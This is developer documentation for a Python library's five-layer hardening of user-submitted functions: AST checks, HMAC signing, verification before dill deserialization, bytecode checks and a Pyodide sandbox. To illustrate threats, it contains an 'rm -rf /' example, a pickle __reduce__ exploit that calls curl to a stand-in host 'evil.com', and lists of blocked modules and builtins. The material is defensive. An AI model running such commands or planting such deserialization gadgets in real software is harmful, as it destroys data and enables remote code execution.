# Dynamic Code Execution Without Decorators - Full Security Hardening

This document explains how to achieve **full 5-layer security hardening** for user-provided code **without requiring users to decorate their functions**.

## The Challenge

When users pass Python code as data (not as decorated steps), the normal decorator-based validation is bypassed:

```python
# ❌ This function is NOT validated (no decorator)
def user_function(data):
    import os  # Would be blocked by decorator, but not here!
    return data

# User passes it as serialized data
serialized = base64.b64encode(dill.dumps(user_function)).decode('utf-8')
```

## The Solution: Validate at Serialization Time

Instead of validating at decoration time, we validate at **serialization time** using the `blazing.dynamic_code` module:

```python
from blazing.dynamic_code import serialize_user_function

# ✅ This validates the function BEFORE serialization
def user_function(data):
    import os  # ← Will be caught and rejected!
    return data

# This will raise SecurityError before serialization happens
serialized, signature = serialize_user_function(user_function, signing_key)
```

## Complete Example

```python
from blazing import Blazing
from blazing.dynamic_code import (
    serialize_user_function,
    execute_signed_function,
    create_signing_key,
)

# Setup
app = Blazing(api_url="...", api_token="...")
SIGNING_KEY = create_signing_key()  # Or load from env

# =========================================================================
# SERVER SIDE: Define executor station (runs in Pyodide sandbox)
# =========================================================================

@app.step(sandboxed=True)  # ← Layer 5: Sandbox isolation
async def execute_user_code(code, sig, *args, services=None, **kwargs):
    """
    Execute signed user code with full validation.

    This station provides Layer 5 (sandbox), and delegates to
    execute_signed_function for Layers 3-4.
    """
    from blazing.dynamic_code import execute_signed_function
    import os

    # Get signing key from executor environment
    key_hex = os.getenv('BLAZING_SIGNING_KEY')
    key = bytes.fromhex(key_hex) if key_hex else None

    return await execute_signed_function(
        code, sig, args, kwargs,
        signing_key=key,           # Layer 3: Signature verification
        validate_bytecode=True,    # Layer 4: Bytecode validation
    )


# =========================================================================
# CLIENT SIDE: User provides function (NO DECORATOR REQUIRED)
# =========================================================================

# User writes a normal Python function
def calculate_total(items):
    """Sum up item prices with tax."""
    return sum(item['price'] * 1.1 for item in items)

# Platform serializes with validation + signing (Layers 1-2)
serialized, signature = serialize_user_function(
    calculate_total,
    signing_key=SIGNING_KEY,    # Layer 2: Signing
    validate=True,              # Layer 1: AST validation
    strict_mode=True,
)
# ✅ Function validated WITHOUT requiring @app.step decorator!

# Execute
result = await app.run(
    "execute_user_code",
    code=serialized,
    sig=signature,
    args=([{'price': 10}, {'price': 20}],),
)
# Result: 33.0 (10*1.1 + 20*1.1)
```

## Security Layers Applied

### Layer 1: Client-Side AST Validation ✅

**Applied by:** `serialize_user_function(..., validate=True)`

**Blocks:**
- Dangerous imports (os, subprocess, socket, etc.)
- Dangerous builtins (eval, exec, open, etc.)
- Filesystem/network operations
- Code execution primitives

**Example:**
```python
def malicious(data):
    import os
    os.system("rm -rf /")  # ❌ Blocked at serialization time

serialized, sig = serialize_user_function(malicious, key)
# Raises: SecurityError: Blocked import found: os
```

### Layer 2: Cryptographic Signing ✅

**Applied by:** `serialize_user_function(..., signing_key=KEY)`

**Prevents:**
- Tampering with serialized code during transit
- Replay attacks (with nonce)
- Unsigned code execution

**Example:**
```python
serialized, signature = serialize_user_function(func, SIGNING_KEY)

# Later, attacker tries to modify code
tampered = serialized[:-10] + "MALICIOUS"

# Executor rejects it
execute_signed_function(tampered, signature, signing_key=SIGNING_KEY)
# Raises: ValueError: Signature verification failed
```

### Layer 3: Signature Verification ✅

**Applied by:** `execute_signed_function(..., signing_key=KEY)`

**Verifies:** Signature BEFORE calling `dill.loads()` (critical!)

**Why critical:**
```python
# dill.loads() can execute code during unpickling!
class Exploit:
    def __reduce__(self):
        import os
        os.system("curl evil.com/pwned")  # Executes during loads()
        return (str, ())

# This is why we MUST verify signature BEFORE dill.loads()
```

**Implementation:**
```python
# Inside execute_signed_function:
if signing_key and signature:
    expected = hmac.new(signing_key, serialized.encode(), sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Signature verification failed")

# Only deserialize AFTER signature verified
func = dill.loads(base64.b64decode(serialized))
```

### Layer 4: Bytecode Validation ✅

**Applied by:** `execute_signed_function(..., validate_bytecode=True)`

**Inspects:** Function bytecode for dangerous opcodes AFTER deserialization

**Blocks:**
```python
def sneaky(x):
    # Client-side AST validator might miss obfuscated code
    return eval(f"{x} + 1")  # ❌ Caught by bytecode validator

# Disassembly shows LOAD_GLOBAL('eval')
execute_signed_function(serialized, sig, validate_bytecode=True)
# Raises: SecurityError: Blocked builtin: eval
```

### Layer 5: Sandbox Isolation ✅

**Applied by:** `@app.step(sandboxed=True)` decorator

**Provides:** Pyodide WASM sandbox with NO I/O access

**Even if all validations failed:**
```python
@app.step(sandboxed=True)  # ← Runs in Pyodide
async def execute_user_code(...):
    # User code runs here in WASM sandbox
    # Even malicious code can't escape:
    import os       # ImportError: No module 'os' in WASM
    open('/etc/passwd')  # No filesystem access
    import socket   # No network access
```

## API Reference

### `serialize_user_function(func, signing_key, validate=True, strict_mode=True)`

Serialize a user function with validation and signing.

**Parameters:**
- `func` (Callable): User function to serialize
- `signing_key` (bytes, optional): HMAC key (32 bytes recommended)
- `validate` (bool): Enable AST validation (default True)
- `strict_mode` (bool): Strict validation mode (default True)

**Returns:**
- Tuple of `(serialized_function, signature)`

**Raises:**
- `SecurityError`: If validation fails
- `ValueError`: If signing_key is invalid

**Example:**
```python
from blazing.dynamic_code import serialize_user_function

def safe_function(x):
    return x * 2

key = b"my-32-byte-secret-key-here!!!!!!!"
serialized, sig = serialize_user_function(safe_function, key)
```

### `execute_signed_function(serialized, signature, args, kwargs, signing_key, validate_bytecode=True)`

Execute a signed user function with full validation chain.

**Must be called from within a `@app.step(sandboxed=True)` for Layer 5.**

**Parameters:**
- `serialized` (str): Base64-encoded dill-serialized function
- `signature` (str): HMAC-SHA256 hex signature
- `args` (tuple): Positional arguments
- `kwargs` (dict): Keyword arguments
- `signing_key` (bytes, optional): HMAC key for verification
- `validate_bytecode` (bool): Enable bytecode validation (default True)

**Returns:**
- Result of executing the user function

**Raises:**
- `ValueError`: If signature verification fails
- `SecurityError`: If bytecode validation fails

**Example:**
```python
@app.step(sandboxed=True)
async def executor(code, sig, *args, services=None, **kwargs):
    from blazing.dynamic_code import execute_signed_function
    return await execute_signed_function(
        code, sig, args, kwargs,
        signing_key=MY_KEY,
        validate_bytecode=True,
    )
```

### `create_signing_key()`

Generate a cryptographically secure 32-byte signing key.

**Returns:**
- 32-byte random key (suitable for HMAC-SHA256)

**Example:**
```python
from blazing.dynamic_code import create_signing_key

key = create_signing_key()
print(f"Store this securely: {key.hex()}")
# Store in environment variable or secret manager
```

### `get_signing_key_from_env(env_var='BLAZING_SIGNING_KEY')`

Load signing key from environment variable.

**Parameters:**
- `env_var` (str): Environment variable name (default 'BLAZING_SIGNING_KEY')

**Returns:**
- Signing key bytes or None if not set

**Example:**
```python
import os
from blazing.dynamic_code import get_signing_key_from_env, create_signing_key

# In production: load from environment
key = get_signing_key_from_env()

# For development: generate and warn
if not key:
    key = create_signing_key()
    print(f"⚠️ No BLAZING_SIGNING_KEY set, using temporary key")
    print(f"Set this: export BLAZING_SIGNING_KEY={key.hex()}")
```

## Deployment Pattern

### Client Side (User-facing API)

```python
from blazing import Blazing
from blazing.dynamic_code import serialize_user_function, get_signing_key_from_env

# Load signing key from environment
SIGNING_KEY = get_signing_key_from_env('BLAZING_SIGNING_KEY')
if not SIGNING_KEY:
    raise ValueError("BLAZING_SIGNING_KEY not set")

# User submits function
def user_strategy(data):
    # User's custom logic
    return [x * 2 for x in data]

# Platform validates + signs
try:
    serialized, signature = serialize_user_function(
        user_strategy,
        signing_key=SIGNING_KEY,
        validate=True,
        strict_mode=True,
    )
    print("✅ User code validated and signed")
except SecurityError as e:
    print(f"❌ User code rejected: {e}")
    # Return error to user with helpful message
```

### Executor Side (Pyodide Worker)

```python
# Executor environment should have BLAZING_SIGNING_KEY set
# Docker: -e BLAZING_SIGNING_KEY=abc123...
# Kubernetes: secretKeyRef from Secret

@app.step(sandboxed=True)
async def execute_user_code(code, sig, *args, services=None, **kwargs):
    """Execute user code with full 5-layer validation."""
    from blazing.dynamic_code import execute_signed_function
    import os

    # Load signing key from executor environment
    key_hex = os.getenv('BLAZING_SIGNING_KEY')
    if not key_hex:
        raise ValueError("Executor not configured with BLAZING_SIGNING_KEY")

    signing_key = bytes.fromhex(key_hex)

    return await execute_signed_function(
        code, sig, args, kwargs,
        signing_key=signing_key,
        validate_bytecode=True,
    )
```

## Testing Without Signatures (Development Only)

For local development/testing, you can disable signatures:

```python
# ⚠️ INSECURE - Development only!
serialized, _ = serialize_user_function(func, signing_key=None)

# Executor accepts unsigned code
@app.step(sandboxed=True)
async def executor(code, sig, *args, **kwargs):
    return await execute_signed_function(
        code, sig, args, kwargs,
        signing_key=None,  # ← Skips signature verification
        validate_bytecode=True,  # ← Still validates bytecode
    )
```

This still provides Layers 1, 4, and 5 (AST, bytecode, sandbox) but NOT Layers 2-3 (signing, verification).

## Comparison: Decorated vs Dynamic

| Feature | `@app.step` Decorator | `serialize_user_function` |
|---------|-------------------------|---------------------------|
| Validation Timing | Decoration time | Serialization time |
| User Experience | Must use decorator | Normal Python function |
| Layer 1 (AST) | ✅ Automatic | ✅ Explicit call |
| Layer 2 (Signing) | ✅ Automatic | ✅ Explicit call |
| Layer 3 (Sig Verify) | ✅ Automatic | ✅ Via executor station |
| Layer 4 (Bytecode) | ✅ Automatic | ✅ Via executor station |
| Layer 5 (Sandbox) | ✅ `sandboxed=True` | ✅ Executor has `sandboxed=True` |
| Use Case | Platform code | User-submitted code |

## Best Practices

1. **Always validate**: Set `validate=True` when calling `serialize_user_function`
2. **Always sign**: Use strong signing keys (32+ bytes) in production
3. **Always sandbox**: Executor station MUST have `sandboxed=True`
4. **Store keys securely**: Use environment variables or secret managers
5. **Rotate keys**: Implement key rotation for production systems
6. **Log rejections**: Log validation failures for security monitoring
7. **Rate limit**: Limit how many functions users can submit per time period

## Security Considerations

### What This Protects Against

✅ **Malicious imports** - Blocks os, subprocess, socket, etc.
✅ **Code execution** - Blocks eval, exec, compile
✅ **Filesystem access** - No open, pathlib in sandbox
✅ **Network access** - No requests, urllib in sandbox
✅ **Code tampering** - Signature verification
✅ **Replay attacks** - Signature with nonce (implement if needed)
✅ **Bytecode injection** - Validates after deserialization

### What This Does NOT Protect Against

❌ **Infinite loops** - Use timeout enforcement in executor
❌ **Memory exhaustion** - Use memory limits in Pyodide
❌ **CPU exhaustion** - Use CPU limits in container
❌ **Logic bugs** - Validate business logic separately

## Examples

- **Simple Example:** [dynamic_code_execution.py](../../examples/dynamic_code_execution.py)
- **Trading Strategies:** [dynamic_trading_strategies.py](../../examples/dynamic_trading_strategies.py)
- **Security Documentation:** [docs/security-dynamic-code-execution.md](security-dynamic-code-execution.md)
- **Attack Vector Coverage:** [docs/security-attack-vector-coverage.md](security-attack-vector-coverage.md) - **80 attack vectors tested** ⭐
